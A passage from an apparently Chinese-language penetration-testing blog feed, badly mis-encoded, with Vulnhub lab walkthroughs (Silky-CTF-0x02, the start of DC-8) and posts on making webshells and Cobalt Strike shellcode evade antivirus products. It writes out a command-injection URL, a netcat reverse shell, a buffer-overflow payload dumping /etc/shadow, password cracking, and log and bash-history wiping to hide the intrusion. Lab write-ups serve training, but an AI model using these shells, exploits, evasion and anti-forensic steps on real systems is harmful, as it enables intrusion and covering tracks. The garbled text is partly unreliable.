http://192.168.31.54/admin.php?username=whoami&amp;password=222222</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-Silky-CTF-0x02/image-20240129163033098.png" alt="image-20240129163033098"></p><p>ç¡®è®¤å­˜åœ¨å‘½ä»¤æ‰§è¡Œæ¼æ´</p><h3 id="3ã€è·å–åå¼¹shell"><a href="#3ã€è·å–åå¼¹shell" class="headerlink" title="3ã€è·å–åå¼¹shell"></a>3ã€è·å–åå¼¹shell</h3><p>è¿™ä¸ªæ—¶å€™è¿›è¡Œshellåå¼¹ï¼Œä½¿ç”¨å¦‚ä¸‹åå¼¹å‘½ä»¤ï¼ˆå¯ä»¥åœ¨å‘½ä»¤åå¼¹ç½‘ç«™è¿›è¡Œé€ä¸€å°è¯•ï¼‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2&gt;&amp;1|nc 192.168.31.50 4444 &gt;/tmp/f</span><br></pre></td></tr></table></figure><p>å¹¶ç”¨ncè¿›è¡Œç›‘å¬ï¼ŒæˆåŠŸè·å–shell</p><p><img src="/img/Vulnhub-Silky-CTF-0x02/image-20240129163627322.png" alt="image-20240129163627322"></p><h1 id="å››ã€ææƒroot"><a href="#å››ã€ææƒroot" class="headerlink" title="å››ã€ææƒroot"></a>å››ã€ææƒroot</h1><h3 id="1ã€æŸ¥æ‰¾SUIDæ–‡ä»¶"><a href="#1ã€æŸ¥æ‰¾SUIDæ–‡ä»¶" class="headerlink" title="1ã€æŸ¥æ‰¾SUIDæ–‡ä»¶"></a>1ã€æŸ¥æ‰¾SUIDæ–‡ä»¶</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-Silky-CTF-0x02/image-20240129163847382.png" alt="image-20240129163847382"></p><p>å¯ä»¥çœ‹åˆ°ä¸€ä¸ªé†’ç›®çš„æ–‡ä»¶ï¼Œå‰å»æŸ¥çœ‹ã€‚</p><p><img src="/img/Vulnhub-Silky-CTF-0x02/image-20240129164023868.png" alt="image-20240129164023868"></p><p>æ˜¯ä¸€ä¸ª755çš„SUIDæ–‡ä»¶ã€‚</p><h3 id="2ã€æŸ¥çœ‹shadowæ–‡ä»¶"><a href="#2ã€æŸ¥çœ‹shadowæ–‡ä»¶" class="headerlink" title="2ã€æŸ¥çœ‹shadowæ–‡ä»¶"></a>2ã€æŸ¥çœ‹shadowæ–‡ä»¶</h3><p>å°è¯•æ‰§è¡Œè¯¥æ–‡ä»¶</p><p><img src="/img/Vulnhub-Silky-CTF-0x02/image-20240129164142441.png" alt="image-20240129164142441"></p><p>è¿™é‡Œæœ‰ç‚¹è’™åœˆï¼ŒæŸ¥çœ‹ä½¬çš„æ–‡ç« å¾—çŸ¥æ­¤å¤„åˆ©ç”¨ç¼“å†²åŒºæº¢å‡ºï¼Œåˆ©ç”¨å¦‚ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cat_shadow $(python -c &#x27;print &quot;A&quot;*64 + &quot;\x62\x59\x6c\x49&quot;&#x27;)</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-Silky-CTF-0x02/image-20240129164347287.png" alt="image-20240129164347287"></p><p>æŸ¥çœ‹åˆ°äº†<code>/etc/shadow</code>æ–‡ä»¶å†…å®¹ï¼Œæ­¤æ—¶å¯ä»¥å¯¹rootã€silkyç”¨æˆ·çš„å¯†ç è¿›è¡Œçˆ†ç ´</p><h3 id="3ã€è·å–rootå¯†ç "><a href="#3ã€è·å–rootå¯†ç " class="headerlink" title="3ã€è·å–rootå¯†ç "></a>3ã€è·å–rootå¯†ç </h3><p>å°†æŸ¥çœ‹åˆ°çš„shadowæ–‡ä»¶ä¸­çš„è´¦å·å¯†ç å¤åˆ¶ä¿å­˜åˆ°æœ¬åœ°ï¼Œæå–èƒ½ç™»é™†çš„è´¦å·å¯†ç </p><p><img src="/img/Vulnhub-Silky-CTF-0x02/image-20240129164854076.png" alt="image-20240129164854076"></p><p>ç”¨john è¿›è¡Œç ´è§£</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john.exe --wordlist=..\rockyou.txt pass.txt</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-Silky-CTF-0x02/image-20240129170910351.png" alt="image-20240129170910351"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œå·²ç»ç ´è§£å‡ºæ¥rootçš„å¯†ç </p><h3 id="4ã€ææƒåˆ°root"><a href="#4ã€ææƒåˆ°root" class="headerlink" title="4ã€ææƒåˆ°root"></a>4ã€ææƒåˆ°root</h3><p>æˆ‘ä»¬å°è¯•su åˆ°rootç”¨æˆ·ï¼Œå´å‡ºç°äº†æ„å¤–ã€‚</p><p><img src="/img/Vulnhub-Silky-CTF-0x02/image-20240129171004305.png" alt="image-20240129171004305"></p><p>è¿™ä¸ªæƒ…å†µè¿˜æ˜¯å¤´ä¸€æ¬¡è§ï¼Œé—®GPTå¾—çŸ¥æ˜¯å› ä¸ºä¸æ˜¯ä¸€ä¸ªäº¤äº’å¼çš„ç»ˆç«¯å¯¼è‡´çš„ã€‚</p><p>ç”¨å¦‚ä¸‹å‘½ä»¤åˆ‡æ¢åˆ°äº¤äº’å¼shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHELL=/bin/bash script -q /dev/null</span><br></pre></td></tr></table></figure><p>åœ¨è¿›è¡ŒrootæˆåŠŸ</p><p><img src="/img/Vulnhub-Silky-CTF-0x02/image-20240129171213571.png" alt="image-20240129171213571"></p><h1 id="äº”ã€ç—•è¿¹æ¸…ç†"><a href="#äº”ã€ç—•è¿¹æ¸…ç†" class="headerlink" title="äº”ã€ç—•è¿¹æ¸…ç†"></a>äº”ã€ç—•è¿¹æ¸…ç†</h1><h3 id="1ã€webæ—¥å¿—æ¸…ç†"><a href="#1ã€webæ—¥å¿—æ¸…ç†" class="headerlink" title="1ã€webæ—¥å¿—æ¸…ç†"></a>1ã€webæ—¥å¿—æ¸…ç†</h3><p>å…ˆæ‰¾åˆ°webæ—¥å¿—çš„ä½ç½®ï¼Œæˆ‘ä»¬åœ¨ä¸€å¼€å§‹ä¿¡æ¯æ”¶é›†ä¸­çŸ¥é“ç½‘ç«™é‡‡ç”¨apache2æœåŠ¡ã€‚æˆ‘ä»¬å¯ä»¥ç›´æ¥æŸ¥æ‰¾apache2çš„é…ç½®æ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name apache2.conf 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-Silky-CTF-0x02/image_20240129193343.png" alt="image_20240129193343.png"></p><p>æŸ¥æ‰¾log çš„ç›¸å…³ä½ç½®</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/apache2/apache2.conf | grep log</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-Silky-CTF-0x02/image_20240129194029.png" alt="image_20240129194029.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name error.log 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-Silky-CTF-0x02/image_20240129194339.png" alt="image_20240129194339.png"></p><p>å°†apache2çš„æ—¥å¿—ä¸‹çš„æ–‡ä»¶éƒ½åˆ é™¤æ‰ï¼Œé¡ºä¾¿æŠŠçœ‹åˆ°çš„mysqlçš„æ—¥å¿—ä¸€å¹¶åˆ é™¤ã€‚</p><p><img src="/img/Vulnhub-Silky-CTF-0x02/image_20240129194419.png" alt="image_20240129194419.png"></p><h3 id="2ã€ç™»å½•æ—¥å¿—æ¸…ç†"><a href="#2ã€ç™»å½•æ—¥å¿—æ¸…ç†" class="headerlink" title="2ã€ç™»å½•æ—¥å¿—æ¸…ç†"></a>2ã€ç™»å½•æ—¥å¿—æ¸…ç†</h3><p>å½“æˆ‘ä»¬ç™»å½•ä¸€å°æœºå™¨çš„æ—¶å€™ä¼šåœ¨æœºå™¨çš„ç™»å½•æ—¥å¿—ä¸­ç•™ä¸‹ç—•è¿¹ã€‚</p><p>æ—¥å¿—ä½ç½®ï¼š&#x2F;var&#x2F;log&#x2F;auth.logï¼ˆCentosç³»ç»Ÿæ˜¯&#x2F;var&#x2F;log&#x2F;secureï¼‰</p><p>å¯ä»¥ç›´æ¥åˆ é™¤è¯¥æ–‡ä»¶ï¼Œä¹Ÿå¯ä»¥ç”¨å¦‚ä¸‹å‘½ä»¤åªåˆ é™¤å‡ è¡Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed $(($(sed -n &#x27;$=&#x27; auth.log)-10+1)),$&#123;A&#125;d -i auth.log#åˆ é™¤å€’æ•°10è¡Œ</span><br></pre></td></tr></table></figure><h3 id="3ã€å†å²å‘½ä»¤æ¸…ç†"><a href="#3ã€å†å²å‘½ä»¤æ¸…ç†" class="headerlink" title="3ã€å†å²å‘½ä»¤æ¸…ç†"></a>3ã€å†å²å‘½ä»¤æ¸…ç†</h3><p>æ­¤æ¬¡æ˜¯ä»wwwç”¨æˆ·ç›´æ¥åˆ°rootï¼Œå› æ­¤æˆ‘ä»¬åªéœ€è¦ç›´æ¥æ¸…é™¤rootç”¨æˆ·çš„å†å²å‘½ä»¤å°±å¯ä»¥äº†ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;&quot; &gt; ~/.bash_history &amp;&amp; history -c</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Vulnhubç³»åˆ—é¶åœº </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€å…æ€ä¸“æ ã€‘Webshell å…æ€è¿‡360ã€Dç›¾ã€æ²³é©¬</title>
      <link href="/2024/02/17/Anti-AntiVirus-Webshell-rouji/"/>
      <url>/2024/02/17/Anti-AntiVirus-Webshell-rouji/</url>
      
        <content type="html"><![CDATA[<h1 id="ã€å…æ€ä¸“æ ã€‘Webshell-å…æ€è¿‡360ã€Dç›¾ã€æ²³é©¬"><a href="#ã€å…æ€ä¸“æ ã€‘Webshell-å…æ€è¿‡360ã€Dç›¾ã€æ²³é©¬" class="headerlink" title="ã€å…æ€ä¸“æ ã€‘Webshell å…æ€è¿‡360ã€Dç›¾ã€æ²³é©¬"></a>ã€å…æ€ä¸“æ ã€‘Webshell å…æ€è¿‡360ã€Dç›¾ã€æ²³é©¬</h1><h1 id="ä¸€ã€å‡†å¤‡å·¥ä½œ"><a href="#ä¸€ã€å‡†å¤‡å·¥ä½œ" class="headerlink" title="ä¸€ã€å‡†å¤‡å·¥ä½œ"></a>ä¸€ã€å‡†å¤‡å·¥ä½œ</h1><p>1ã€roujiè„šæœ¬</p><p>ç™¾åº¦ç½‘ç›˜å¯ä¸‹è½½</p><p>GitHubé¡¹ç›®åœ°å€ï¼š<a href="https://github.com/ytMuCheng/ruoji">https://github.com/ytMuCheng/ruoji</a> </p><p>2ã€ç¯å¢ƒé…ç½®</p><p>python3 çš„ç¯å¢ƒæ¨¡å—</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install -r re.txt</span><br></pre></td></tr></table></figure><h1 id="äºŒã€å…æ€æ“ä½œ"><a href="#äºŒã€å…æ€æ“ä½œ" class="headerlink" title="äºŒã€å…æ€æ“ä½œ"></a>äºŒã€å…æ€æ“ä½œ</h1><p>è¿è¡Œè„šæœ¬ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python webshell_bypass_5.1.py -c 1</span><br></pre></td></tr></table></figure><p>å‚æ•°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">optional arguments:</span><br><span class="line">  -h, --help            show this help message and exit</span><br><span class="line">  -p PHP, --php PHP     -p æ–‡ä»¶å or --php æ–‡ä»¶å</span><br><span class="line">  -j JSP, --jsp JSP     -j æ–‡ä»¶å or --jsp æ–‡ä»¶å</span><br><span class="line">  -c CONFIG, --config CONFIG</span><br><span class="line">                        ä¼ªè£…æ¨¡æ¿ï¼ˆ1-7ï¼‰ -c 1 or --config 1</span><br></pre></td></tr></table></figure><h3 id="1ã€æ–¹å¼ä¸€ï¼šå…æ€èšå‰‘"><a href="#1ã€æ–¹å¼ä¸€ï¼šå…æ€èšå‰‘" class="headerlink" title="1ã€æ–¹å¼ä¸€ï¼šå…æ€èšå‰‘"></a>1ã€æ–¹å¼ä¸€ï¼šå…æ€èšå‰‘</h3><p>1ã€èšå‰‘å…æ€</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python webshell_bypass_5.1.py -p shell.php#shell.phpæ˜¯è¦ç”Ÿæˆçš„webshellåç§°</span><br></pre></td></tr></table></figure><p><img src="/img/Anti-AntiVirus-Webshell-rouji/image-20240217151624329.png" alt="image-20240217151624329"></p><p>2ã€ä¸Šçº¿èšå‰‘ï¼š</p><p><img src="/img/Anti-AntiVirus-Webshell-rouji/image-20240217152934707.png" alt="image-20240217152934707"></p><p><img src="/img/Anti-AntiVirus-Webshell-rouji/image-20240217153021578.png" alt="image-20240217153021578"></p><p>3ã€360ã€ç«ç»’ç»•è¿‡ï¼š</p><p><img src="/img/Anti-AntiVirus-Webshell-rouji/image-20240217151813920.png" alt="image-20240217151813920"></p><p>Dç›¾ç»•è¿‡ï¼š</p><p><img src="/img/Anti-AntiVirus-Webshell-rouji/image-20240217152401086.png" alt="image-20240217152401086"></p><p><img src="/img/Anti-AntiVirus-Webshell-rouji/image-20240217152334275.png" alt="image-20240217152334275"></p><p>4ã€æ²³é©¬ç»•è¿‡ï¼š</p><p><img src="/img/Anti-AntiVirus-Webshell-rouji/image-20240217152606824.png" alt="image-20240217152606824"></p><p><img src="/img/Anti-AntiVirus-Webshell-rouji/image-20240217152619283.png" alt="image-20240217152619283"></p><h3 id="2ã€æ–¹å¼äºŒã€å…æ€å“¥æ–¯æ‹‰"><a href="#2ã€æ–¹å¼äºŒã€å…æ€å“¥æ–¯æ‹‰" class="headerlink" title="2ã€æ–¹å¼äºŒã€å…æ€å“¥æ–¯æ‹‰"></a>2ã€æ–¹å¼äºŒã€å…æ€å“¥æ–¯æ‹‰</h3><p>1ã€å“¥æ–¯æ‹‰å…æ€</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python webshell_bypass_5.1.py -p shell-gsl.php</span><br></pre></td></tr></table></figure><p><img src="/img/Anti-AntiVirus-Webshell-rouji/image-20240217153959144.png" alt="image-20240217153959144"></p><p><img src="/img/Anti-AntiVirus-Webshell-rouji/image-20240217154034876.png" alt="image-20240217154034876"></p><h3 id="3ã€æ–¹å¼ä¸‰ã€å…æ€å†°è"><a href="#3ã€æ–¹å¼ä¸‰ã€å…æ€å†°è" class="headerlink" title="3ã€æ–¹å¼ä¸‰ã€å…æ€å†°è"></a>3ã€æ–¹å¼ä¸‰ã€å…æ€å†°è</h3><p>è¿™é‡Œéœ€è¦å†°è4.0.5</p><p><img src="/img/Anti-AntiVirus-Webshell-rouji/193225423-baf0d469-9bd3-43ee-9967-a1cdb7dfd375.png" alt="image"></p>]]></content>
      
      
      <categories>
          
          <category> å…æ€ä¸“æ  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å…æ€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€å…æ€ä¸“æ ã€‘CS-shellcode å…æ€è¿‡360ã€ç«ç»’</title>
      <link href="/2024/02/17/Anti-AntiVirus-CS-shellcode/"/>
      <url>/2024/02/17/Anti-AntiVirus-CS-shellcode/</url>
      
        <content type="html"><![CDATA[<h1 id="ã€å…æ€ä¸“æ ã€‘CS-shellcode-å…æ€è¿‡360ã€ç«ç»’"><a href="#ã€å…æ€ä¸“æ ã€‘CS-shellcode-å…æ€è¿‡360ã€ç«ç»’" class="headerlink" title="ã€å…æ€ä¸“æ ã€‘CS-shellcode å…æ€è¿‡360ã€ç«ç»’"></a>ã€å…æ€ä¸“æ ã€‘CS-shellcode å…æ€è¿‡360ã€ç«ç»’</h1><h1 id="ä¸€ã€å‡†å¤‡å·¥ä½œ"><a href="#ä¸€ã€å‡†å¤‡å·¥ä½œ" class="headerlink" title="ä¸€ã€å‡†å¤‡å·¥ä½œ"></a>ä¸€ã€å‡†å¤‡å·¥ä½œ</h1><p>1ã€æ©æ—¥ï¼ˆåŒå‡»è¿è¡Œï¼‰</p><p><img src="/img/Anti-AntiVirus-CS-shellcode/image-20240217133149368.png" alt="image-20240217133149368"></p><p>2ã€cs çš„shellcode</p><p><img src="/img/Anti-AntiVirus-CS-shellcode/image-20240217133933233.png" alt="image-20240217133933233"></p><h1 id="äºŒã€å…æ€æ–¹å¼"><a href="#äºŒã€å…æ€æ–¹å¼" class="headerlink" title="äºŒã€å…æ€æ–¹å¼"></a>äºŒã€å…æ€æ–¹å¼</h1><h3 id="1ã€æ–¹å¼ä¸€ï¼šæœ¬åœ°åˆ†ç¦»"><a href="#1ã€æ–¹å¼ä¸€ï¼šæœ¬åœ°åˆ†ç¦»" class="headerlink" title="1ã€æ–¹å¼ä¸€ï¼šæœ¬åœ°åˆ†ç¦»"></a>1ã€æ–¹å¼ä¸€ï¼šæœ¬åœ°åˆ†ç¦»</h3><p><img src="/img/Anti-AntiVirus-CS-shellcode/image-20240217135029538.png" alt="image-20240217135029538"></p><p>ç«ç»’ç»•è¿‡ï¼š</p><p><img src="/img/Anti-AntiVirus-CS-shellcode/image-20240217134949441.png" alt="image-20240217134949441"></p><p><img src="/img/Anti-AntiVirus-CS-shellcode/image-20240217135133852.png" alt="image-20240217135133852"></p><p>360ç»•è¿‡ï¼š</p><p><img src="/img/Anti-AntiVirus-CS-shellcode/image-20240217135341075.png" alt="image-20240217135341075"></p><h3 id="2ã€æ–¹å¼äºŒã€ç½‘ç»œåˆ†ç¦»"><a href="#2ã€æ–¹å¼äºŒã€ç½‘ç»œåˆ†ç¦»" class="headerlink" title="2ã€æ–¹å¼äºŒã€ç½‘ç»œåˆ†ç¦»"></a>2ã€æ–¹å¼äºŒã€ç½‘ç»œåˆ†ç¦»</h3><p>æš‚æ—¶æç½®</p><h1 id="ä¸‰ã€æ€»ç»“"><a href="#ä¸‰ã€æ€»ç»“" class="headerlink" title="ä¸‰ã€æ€»ç»“"></a>ä¸‰ã€æ€»ç»“</h1><p>æ©æ—¥æ˜¯ä¸€æ¬¾é€‚ç”¨äºçº¢é˜Ÿçš„ç»¼åˆå…æ€å·¥å…·ï¼Œå…¶ä¸­åŒ…æ‹¬æœ‰ï¼šé€šç”¨å…æ€ã€æœ¬åœ°åˆ†ç¦»ã€ç½‘ç»œåˆ†ç¦»ç­‰å¤šç§å…æ€æ–¹å¼å’Œæ€è½¯è¯†åˆ«ç­‰åŠŸèƒ½ï¼Œæ“ä½œç®€å•ï¼Œå…æ€æ•ˆæœå¼ºæ‚ï¼Œæ˜¯ä¸€ä¸ªéå¸¸ä¼˜ç§€çš„é¡¹ç›®</p>]]></content>
      
      
      <categories>
          
          <category> å…æ€ä¸“æ  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å…æ€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€Vulnhubç³»åˆ—ã€‘Vulnhubé¶åœº_DC-8</title>
      <link href="/2024/02/17/Vulnhub-DC-8/"/>
      <url>/2024/02/17/Vulnhub-DC-8/</url>
      
        <content type="html"><![CDATA[<h1 id="ã€Vulnhubç³»åˆ—é¶åœºã€‘Vulnhub-DC-8é¶åœºæ¸—é€"><a href="#ã€Vulnhubç³»åˆ—é¶åœºã€‘Vulnhub-DC-8é¶åœºæ¸—é€" class="headerlink" title="ã€Vulnhubç³»åˆ—é¶åœºã€‘Vulnhub_DC-8é¶åœºæ¸—é€"></a>ã€Vulnhubç³»åˆ—é¶åœºã€‘Vulnhub_DC-8é¶åœºæ¸—é€</h1><h1 id="ä¸€ã€ç¯å¢ƒé…ç½®"><a href="#ä¸€ã€ç¯å¢ƒé…ç½®" class="headerlink" title="ä¸€ã€ç¯å¢ƒé…ç½®"></a>ä¸€ã€ç¯å¢ƒé…ç½®</h1><p>ä»ç™¾åº¦ç½‘ç›˜ä¸‹è½½</p><p><img src="/img/Vulnhub-DC-8/image-20240203171154383.png" alt="image-20240203171154383"></p><p>åœ¨vmä¸­ã€æ‰“å¼€ã€‘ï¼Œå¹¶é€‰æ‹©ä½ç½®ï¼Œå¯ä»¥ä¸ç”¨è¾“å…¥åç§°</p><p><img src="/img/Vulnhub-DC-8/image-20240203171250363.png" alt="image-20240203171250363"></p><p><img src="/img/Vulnhub-DC-8/image-20240203171325101.png" alt="image-20240203171325101"></p><p>æ‰“å¼€é¶æœºè¿è¡Œä¹‹åï¼Œæ›´æ”¹ç½‘ç»œé€‚é…å™¨ä¸ºNATå³å¯ã€‚</p><p><img src="/img/Vulnhub-DC-8/image-20240203171434414.png" alt="image-20240203171434414"></p><h1 id="äºŒã€ä¿¡æ¯æ”¶é›†"><a href="#äºŒã€ä¿¡æ¯æ”¶é›†" class="headerlink" title="äºŒã€ä¿¡æ¯æ”¶é›†"></a>äºŒã€ä¿¡æ¯æ”¶é›†</h1><h3 id="1ã€ä¸»æœºå‘ç°"><a href="#1ã€ä¸»æœºå‘ç°" class="headerlink" title="1ã€ä¸»æœºå‘ç°"></a>1ã€ä¸»æœºå‘ç°</h3><p><img src="/img/Vulnhub-DC-8/image-20240203171629450.png" alt="image-20240203171629450"></p><h3 id="2ã€ç«¯å£æ‰«æ"><a href="#2ã€ç«¯å£æ‰«æ" class="headerlink" title="2ã€ç«¯å£æ‰«æ"></a>2ã€ç«¯å£æ‰«æ</h3><p>1ã€å¯ä»¥å…ˆç”¨-F å‚æ•°è¿›è¡Œç²—ç•¥çš„å¿«é€Ÿæ¢æµ‹</p><p><img src="/img/Vulnhub-DC-8/image-20240203171939947.png" alt="image-20240203171939947"></p><p>2ã€ä¹‹åå†è¿›è¡Œç²¾ç»†æ¢æµ‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap.exe -sT --min-rate 10000 -p- 192.168.31.58#ä»¥æœ€å°10000é€Ÿç‡è¿›è¡ŒTCPå…¨ç«¯å£æ‰«æ</span><br><span class="line">nmap.exe -sU --min-rate 10000 -p- 192.168.31.58#ä»¥æœ€å°10000é€Ÿç‡è¿›è¡ŒUDPå…¨ç«¯å£æ‰«æ</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-DC-8/image-20240203173646700.png" alt="image-20240203173646700"></p><p><img src="/img/Vulnhub-DC-8/image-20240203173308040.png" alt="image-20240203173308040"></p><p>åªæœ‰TCPå¼€æ”¾äº†22ã€80ç«¯å£ã€‚</p><p>3ã€ç”¨é»˜è®¤è„šæœ¬å¯¹å¼€æ”¾çš„22ã€80ç«¯å£åœ¨è¿›è¡Œå…¨æ‰«æ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap.exe -sT -sV -sC -O -p22,80 192.168.31.58</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-DC-8/image-20240203174215473.png" alt="image-20240203174215473"></p><p>ç¡®è®¤æ˜¯ä¸€ä¸ªlinuxæ“ä½œç³»ç»Ÿã€‚</p><p>4ã€ç”¨æ¼æ´è„šæœ¬å¯¹å¼€æ”¾ç«¯å£è¿›è¡Œæ¼æ´æ¢æµ‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap.exe --script=vuln -p22,80 192.168.31.58</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-DC-8/image-20240203174154877.png" alt="image-20240203174154877"></p><p>å¹¶æœªå‘ç°æœ‰ç”¨çš„æ¼æ´ï¼Œåªè¿›è¡Œäº†ä¸€äº›ç›®å½•æ¢æµ‹</p><h3 id="3ã€webæ¼æ´æ¢æµ‹"><a href="#3ã€webæ¼æ´æ¢æµ‹" class="headerlink" title="3ã€webæ¼æ´æ¢æµ‹"></a>3ã€webæ¼æ´æ¢æµ‹</h3><p>è®¿é—®ä¸€ä¸‹webç›®å½•</p><p><img src="/img/Vulnhub-DC-8/image-20240203172515316.png" alt="image-20240203172515316"></p><p>åœ¨kaliä¸­ç”¨whatweb è¯†åˆ«webæ¡†æ¶</p><p><img src="/img/Vulnhub-DC-8/image-20240203172733990.png" alt="image-20240203172733990"></p><p>æœ‰å…³Drupal 7 çš„ç›¸å…³æ¼æ´æœ‰å¾ˆå¤šç°æˆçš„åˆ©ç”¨æ–¹å¼ï¼Œå¯ç”¨searchsploit è¿›è¡Œæœç´¢ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit.cmd Drupal 7</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-DC-8/image-20240203172935465.png" alt="image-20240203172935465"></p><p>ä½†æ˜¯åˆ©ç”¨æ–¹å¼åˆ†å…·ä½“çš„ç‰ˆæœ¬ä¿¡æ¯ï¼Œæˆ‘ä»¬æš‚æ—¶è¿˜ä¸çŸ¥é“ç‰ˆæœ¬çš„ä¿¡æ¯ã€‚</p><h3 id="4ã€webç›®å½•æ¢æµ‹"><a href="#4ã€webç›®å½•æ¢æµ‹" class="headerlink" title="4ã€webç›®å½•æ¢æµ‹"></a>4ã€webç›®å½•æ¢æµ‹</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch.cmd -u http://192.168.31.58 -x 404,403#è¿‡æ»¤æ‰404ï¼Œ403çš„å“åº”</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-DC-8/image-20240203174337667.png" alt="image-20240203174337667"></p><h1 id="ä¸‰ã€è·å–shellç«‹è¶³ç‚¹"><a href="#ä¸‰ã€è·å–shellç«‹è¶³ç‚¹" class="headerlink" title="ä¸‰ã€è·å–shellç«‹è¶³ç‚¹"></a>ä¸‰ã€è·å–shellç«‹è¶³ç‚¹</h1><h3 id="1ã€æŸ¥çœ‹æ•æ„Ÿç›®å½•æ–‡ä»¶"><a href="#1ã€æŸ¥çœ‹æ•æ„Ÿç›®å½•æ–‡ä»¶" class="headerlink" title="1ã€æŸ¥çœ‹æ•æ„Ÿç›®å½•æ–‡ä»¶"></a>1ã€æŸ¥çœ‹æ•æ„Ÿç›®å½•æ–‡ä»¶</h3><p>1ã€robots.txtæ–‡ä»¶ï¼šå¹¶æ²¡æœ‰å¤ªå¤šæœ‰ç”¨çš„ä¿¡æ¯ï¼Œåªç»™äº†ä¸€äº›ç›®å½•åŠæ–‡ä»¶ã€‚</p><p><img src="/img/Vulnhub-DC-8/image-20240203174733596.png" alt="image-20240203174733596"></p><p>2ã€install.phpæ–‡ä»¶ï¼šçœ‹åå­—æ˜¯ä¸€ä¸ªå®‰è£…æ–‡ä»¶ï¼Œæœ‰é‡è£…ç½‘ç«™çš„é£é™©ï¼Œä½†æ˜¯ä¾ç„¶æ— ç”¨ã€‚</p><p>æç¤ºè¦ä¹ˆåœ¨æ•°æ®åº“ä¸­åˆ é™¤ç°æœ‰çš„æ•°æ®åº“ä¿¡æ¯ï¼Œè¦ä¹ˆåœ¨settings.php æ–‡ä»¶ä¸­é‡æ–°é…ç½®æˆæ–°çš„æ•°æ®åº“ã€‚</p><p><img src="/img/Vulnhub-DC-8/image-20240203174944771.png" alt="image-20240203174944771"></p><p>3ã€web.configæ–‡ä»¶ï¼šåœ¨æºä»£ç ä¸­çœ‹åˆ°åœ¨é¦–é¡µindex.phpæ–‡ä»¶æœ‰ä¸€ä¸ªqçš„å‚æ•°æ¥å£ã€‚</p><p><img src="/img/Vulnhub-DC-8/image-20240203175425156.png" alt="image-20240203175425156"></p><p><img src="/img/Vulnhub-DC-8/image-20240203175515852.png" alt="image-20240203175515852"></p><p><img src="/img/Vulnhub-DC-8/image-20240203175532328.png" alt="image-20240203175532328"></p><p>åœ¨å‡ æ¬¡çš„å°è¯•ä¹‹åå‘ç°æ˜¯ä¸€ä¸ªæŒ‡è·¯çš„å‚æ•°ã€‚</p><p>4ã€xmlrpc.phpæ–‡ä»¶ï¼šä¸€ä¸ªå¥‡æ€ªçš„æ–‡ä»¶åï¼ŒæŸ¥çœ‹æ˜¯ä¸€ä¸ªxml-rpcæœåŠ¡ï¼Œä¸”éœ€è¦postæäº¤</p><p><img src="/img/Vulnhub-DC-8/image-20240203180428347.png" alt="image-20240203180428347"></p><p>ç”¨HackBar 